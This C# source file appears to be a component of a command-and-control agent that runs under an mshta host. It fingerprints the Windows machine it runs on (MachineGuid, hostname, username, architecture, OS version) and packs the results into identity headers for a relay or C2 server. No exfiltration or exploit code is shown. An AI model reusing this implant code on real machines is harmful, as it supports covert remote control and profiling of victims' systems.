using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace CSharpAgent
{
    // Builds the X-Agent-* identity header set (API 1) — the SAME contract the JScript agent
    // ships, so an upgrade takeover keeps ONE stable agent row: the UUID is the same MachineGuid
    // the JScript agent reads, and every field is derived the same way. The differences from
    // the JScript agent are exactly two: X-Agent-Name-Id is 2 (this breed) and
    // X-Agent-Capabilities carries ONLY the UpgradeNative bit (category 4 → 1000000000000000).
    internal static class Identity
    {
        internal const string Capabilities = "1000000000000000";
        internal const int BreedId = 2;

        internal static string[][] Build()
        {
            var guid = "";
            try
            {
                guid = (Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography",
                    "MachineGuid", "") as string ?? "").ToLowerInvariant();
            }
            catch { }
            // The machine UUID is nullable: a malformed/absent MachineGuid is NOT replaced
            // with a random GUID (that fabricated a fresh phantom identity per process) —
            // the header is simply omitted and the relay treats the agent as identity-less.
            if (!LooksLikeGuid(guid)) guid = "";

            var machineArch = MachineArch();
            var processArch = ProcessArch();
            var version = OsVersion();

            // REQUIRED headers carry compile-time constants. Every detection-derived field
            // is OPTIONAL: a value that could not be detected OMITS the header — never sent
            // as "" — so the relay/C2 see "not reported" instead of a fabricated default.
            // There is NO Bitness header: the process arch already carries the full width,
            // and x86_64/aarch64 are both 64-bit — a bare bit flag would say nothing about
            // which.
            var headers = new List<string[]>
            {
                new[] { "X-Agent-Api-Version", "1" },
                new[] { "X-Agent-Platform", "Windows" },
                new[] { "X-Agent-Name-Id", BreedId.ToString() },
                new[] { "X-Agent-Capabilities", Capabilities }
            };
            AddOptional(headers, "X-Agent-Machine-Uuid", guid);
            AddOptional(headers, "X-Agent-Hostname", Environment.MachineName);
            AddOptional(headers, "X-Agent-Username", Environment.UserName);
            AddOptional(headers, "X-Agent-Arch", machineArch);
            AddOptional(headers, "X-Agent-Process-Arch", processArch);
            AddOptional(headers, "X-Agent-Os-Version", version);
            AddOptional(headers, "X-Agent-Build", BuildNumber(version));
            return headers.ToArray();
        }

        /// <summary>Appends an OPTIONAL identity header only when its detection produced a
        /// value — omission is the wire form of "could not detect" (agents never send empty
        /// strings or placeholders).</summary>
        private static void AddOptional(List<string[]> headers, string name, string value)
        {
            if (!string.IsNullOrEmpty(value)) headers.Add(new[] { name, value });
        }

        private static bool LooksLikeGuid(string value)
        {
            if (value == null || value.Length != 36) return false;
            for (var i = 0; i < value.Length; i++)
            {
                var c = value[i];
                var dash = i == 8 || i == 13 || i == 18 || i == 23;
                if (dash) { if (c != '-') return false; }
                else if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) return false;
            }
            return true;
        }

        // Machine arch via GetNativeSystemInfo — WOW64-proof (the JScript agent takes the WMI
        // CPU Architecture code; the native call is its equivalent). Same output vocabulary:
        // 9 → x86_64, 0 → i386, 12 → aarch64.
        private static string MachineArch()
        {
            try
            {
                SYSTEM_INFO info;
                NativeImports.GetNativeSystemInfo(out info);
                if (info.wProcessorArchitecture == 9) return "x86_64";
                if (info.wProcessorArchitecture == 0) return "i386";
                if (info.wProcessorArchitecture == 12) return "aarch64";
            }
            catch { }
            var env = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
            if (string.IsNullOrEmpty(env)) env = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            return MapArchName(env);
        }

        // Process arch from PROCESSOR_ARCHITECTURE (the arch of the process we run IN — the
        // x86 mshta host under EnsureX86Host reports x86). Unmapped values contribute "".
        private static string ProcessArch()
        {
            return MapArchName(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"));
        }

        private static string MapArchName(string value)
        {
            if (value == "AMD64") return "x86_64";
            if (value == "x86") return "i386";
            if (value == "ARM64") return "aarch64";
            return "";
        }

        // OS version via RtlGetVersion — the truthful source (Environment.OSVersion inherits
        // the host manifest's compatibility lies on Windows 8.1+; the JScript agent uses WMI
        // for the same reason). Format: "major.minor.build" — X-Agent-Build is its tail.
        private static string OsVersion()
        {
            try
            {
                var info = new OSVERSIONINFOW();
                info.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOW));
                if (NativeImports.RtlGetVersion(ref info) == 0)
                    return info.dwMajorVersion + "." + info.dwMinorVersion + "." + info.dwBuildNumber;
            }
            catch { }
            var v = Environment.OSVersion.Version;
            return v.Major + "." + v.Minor + "." + v.Build;
        }

        private static string BuildNumber(string osVersion)
        {
            if (osVersion == null) return "";
            var lastDot = osVersion.LastIndexOf('.');
            return lastDot < 0 ? osVersion : osVersion.Substring(lastDot + 1);
        }
    }
}
